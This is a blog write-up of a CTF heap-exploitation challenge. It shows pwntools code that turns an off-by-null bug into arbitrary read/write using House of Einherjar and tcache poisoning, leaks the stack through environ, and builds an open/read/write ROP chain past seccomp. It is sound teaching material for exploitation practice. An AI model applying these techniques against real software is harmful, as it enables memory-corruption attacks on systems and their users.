+++
title = '0XFUN CTF 67 Revenge'
date = 2026-02-15T11:02:34+02:00
tags = ["pwn", "Heap", "0xFUN"]
categories = ["CTF"]
+++

This weekend I played my first CTF of the year : the 0XFFUN CTF. I actually only played for some hours but managed to solve two "hard" challenges Warden and 67 Revenge :)

This is my writeup for 67 Revenge

# TLDR
1. [Vulnerability](#vulnerability)
2. [Leak Heap and Libc](#leak-heap-and-libc)
3. [Heap Spray](#heap-spray)
4. [House of Einherjar](#house-of-einherjar)
5. [Leak Stack](#leak-stack)
6. [Ropchain](#rop-chain)

While the challenge was ranked as hard on the CTF, it's a fairly standard heap challenge exploitation where I got stuck mainly ~~because someone that will recognise himself told me consolidation was impossible~~ on strange things and stuff that shows my lack of recent practice on heap exploits.

This is the reason while this writeup will probably be less developped than usually.

## Vulnerability

All the protections are present on the binary and it uses libc 2.42. You can find the files of the challenge [here](https://github.com/Ret2skillz/CTFs/tree/main/0XFUN2026) (Try the exploit on chall_patched as the Dockerfile doesn't work at all like the local or remote)

![checksec](/images/checksec_67.png)

There is also a seccomp in place on the binary

![seccomp](/images/seccomp_67.png)

The challenge is a very standard heap challenge with a menu where we can create/edit/free/read chunks. We can chose the size and index of the chunks when allocating them. The only limitations is we can allocate a maximum of 16 chunks at a time only.

![67](/images/67.png)

The vulnerability is an Off-by-Null in the edit functionality where if we enter the exact amount of size data, the challenge will add a null byte at the end. Thus we can get one byte null overflow on the size of the next chunk.

## Leak Heap and Libc

Before anything, we need to leak the heap and the libc. We can just manipulate the sizes and data sent of the create to leak heap, and use an unsorted bin with the same tactic to leak a libc.

```python
#heap leak
create(b'0', b'100', b'A')
create(b'1', b'100', b'B'*64)
create(b'2', b'100', b'C')

read(b'1')

r.recvuntil(b'B'*64)
heap_leak = u64(r.recv(6).strip().ljust(8, b'\x00'))
log.info(f'heap_leak: {hex(heap_leak)}')

heap_base = heap_leak - 0x30e0
log.info(f'heap_base: {hex(heap_base)}')

#simple leak to get libc base
create(b'3', b'1280', b'a'*1280)

delete(b'3')

create(b'4', b'1280', b'a')


read(b'4')

r.recvuntil(b': ')
leak = u64(r.recv(6).strip().ljust(8, b'\x00'))
log.info(f'leak: {hex(leak)}')

libc.address = leak - 0x1e8061
log.info(f'libc.address: {hex(libc.address)}')
```

## Heap Spray

One weird behavior of the challenge is that there is a looooot of already allocated and freed chunks on the heap. I don't know if it comes from printf or something, I didn't try to understand it. One thing tho is that it forces us to do some heap spray. And that's where my first problems started. Basically since we have an off-by-null the classic exploit is to use House of Einherjar. For this we need to be able to have 3 consecutive chunks. That's why the spray is important. I had to do some experiments on the sizes of chunks to allocate as it would give different results.

First I experimented with allocating a bunch of chunks of size 0x40, after allocating around 10 they do end up all at the end of the chunk list. The problem is for House of Einherjar to work we would need to allocate 7 chunks àf size 0x100 to fill the tcache.

After experimenting I found the following spray worked in giving me the 3 consecutive chunks I needed.

```python
#delete chunks cos of 16 chunks limit
for i in range(5):
    delete(str(i).encode())

#some spray cos there was lotta weird chunks on heap so we need three predictable consecutive chunks
for i in range(0, 7):
    create(str(i).encode(), b'248', b'A'*248)

for i in range(7, 11):
    create(str(i).encode(), b'56', b'A'*56)

#the chunks for house of einherjar
create(b'11', b'56', p64(0x0) + p64(0x70) + p64(heap_base+0x29c0) + p64(heap_base+0x29c0) + b'B'*24)
create(b'12', b'56', b'C'*48)
create(b'13', b'248', b'D'*248)
```

## House of Einherjar

You can find the technique described in more details [here](https://github.com/shellphish/how2heap/blob/master/glibc_2.41/house_of_einherjar.c)

Basically the gist of the technique is to allocate three chunks : A will contain a fake chunk that will be use in consolidating. B will be the chunk used to overflow on the size of C. By modifying the prev_size of C and its prev_inuse bit. When we free it it will consolidate with our fake chunk in A, thus allowing us to get a big chunk on A while B is still free.

Then we can use chunk A to overflow on the fd of B and get an allocation where we want.

At first I tried to allocate on tcache_perthread_struct, which is a classic way to gain AAR/AAW. But I had weird errors. Then I lost a lot of times forgetting that malloc need an aligned chunk on next allocations. I don't know exactly which syscall malloc calls when there is this error, but it was catched by the seccomp and was returning only not allowed syscall. 

In the end I just decided to free the chunk we can overflow on everytime and reallocate as much as i needed. It's a bit dirty but it does give AAR/AAW.

You can use **catch syscall** in gef to follow all the syscalls made and realise the problem is just the misaligned chunk.

The following code does the House of Einherjar (I added some comments to understand it)

```python
edit(b'12', b'C'*56)
edit(b'12', b'C'*48 + p64(0x70))

#fill tcache
for i in range(7):
    delete(str(i).encode())

delete(b'13')

#now we reclaim a chunk of size 0x170
create(b'14', b'344', b'D')

create(b'15', b'46', b'E'*46)
delete(b'15')
delete(b'12')
```

Now when we edit chunk 14 we will be able to overflow on chunk 12.

## Leak Stack

Since we have a seccomp, we need to do a open/read/write ropchain on the stack, so we first need a stack leak.

To leak the stack the classic technique is to read the **environ** symbol from the libc. We can just allocate right before **environ** (making sure it's aligned on 0x10), then when reading the chunk we'll get our stack leak.

```python
#simple overflow on 12, dirty but can just do it again and again to write where we want
target = libc.symbols['environ']-0x18
restore = heap_base + 0x2980
edit(b'14', b'D'*40 + p64(0x41) + p64(target^((heap_base+0x2a00)>>12)))

create(b'12', b'56', b'F'*56)
create(b'15', b'56', b'G'*24)

read(b'15')

#write before environ aligned to stack leak
r.recvuntil(b'G'*24)
environ_leak = u64(r.recv(6).strip().ljust(8, b'\x00'))
log.info(f'environ leak: {hex(environ_leak)}')

ret_read = environ_leak - 0x150
log.info(f'ret_read: {hex(ret_read)}')
```

## Ropchain

Finally we can just do a ropchain on the return address we leaked. 

The only things to consider are : 
1. We need in this case to write in several cases
2. We need make sure every allocatio on the stack end up aligned
3. We need to make sure to overwrite the ret at the end or the program will just crash immediatly.

The ropchain is a simple open/read/write, I used a chunk on the heap to store the flag.txt buffer, and all gadgets from the libc.

```python
delete(b'12')

#write ropchain in 4 times lol
flag_addr = heap_base + 0x2a00 #addr of chunk 12
target = ret_read+0x8
edit(b'14', b'D'*40 + p64(0x41) + p64(target^((heap_base+0x2a00)>>12)))

create(b'12', b'56', b'F'*56)
create(b'0', b'56', p64(flag_addr)+p64(pop_rsi)+p64(0)+p64(pop_rdx_xoreax)+p64(0)+p64(pop_rax))

delete(b'12')

target = ret_read+0x38
edit(b'14', b'D'*40 + p64(0x41) + p64(target^((heap_base+0x2a00)>>12)))

create(b'12', b'56', b'F'*56)
create(b'1', b'56', p64(0x2)+p64(syscall)+p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_base+0x10))

delete(b'12')

target = ret_read+0x68
edit(b'14', b'D'*40 + p64(0x41) + p64(target^((heap_base+0x2a00)>>12)))

create(b'12', b'56', b'F'*56)
create(b'2', b'56', p64(pop_rdx_xoreax)+p64(0x40)+p64(syscall)+p64(pop_rdi)+p64(1)+p64(pop_rsi))

delete(b'12')

target = ret_read+0x98
edit(b'14', b'D'*40 + p64(0x41) + p64(target^((heap_base+0x2a00)>>12)))

create(b'12', b'56', b'F'*56)
create(b'3', b'56', p64(heap_base+0x10)+p64(pop_rdx_xoreax)+p64(0x40)+p64(pop_rax)+p64(1)+p64(syscall))

delete(b'12')

target = ret_read-0x8
edit(b'14', b'D'*40 + p64(0x41) + p64(target^((heap_base+0x2a00)>>12)))

#allocate on read_note ret at the end to not crash immediatly and leak the flag
create(b'12', b'56', b'./flag.txt\x00')
create(b'4', b'56', b'G'*8 + p64(pop_rdi))

r.interactive()
```

Overall the challenge wasn't really hard despite the CTF saying so, I mostly wasted time on dumb stuff during the CTF. That is also why this writeup is not so detailed.

The most frustrating thing tho was while the challenge works immediatly on local, the Dockerfile is weird in that not even the heap leak works. In remote the server was very slow and often it would just drop connection before it would finish. I wasted some time trying to debug potential differences in environnement before realising this.

In the end after cleaning my exploit a bit on the spray I managed to solve it in remote. Fun fact tho is I tried to launch it again on last day of CTF to screenshot the flag but it wouldn't work this time....


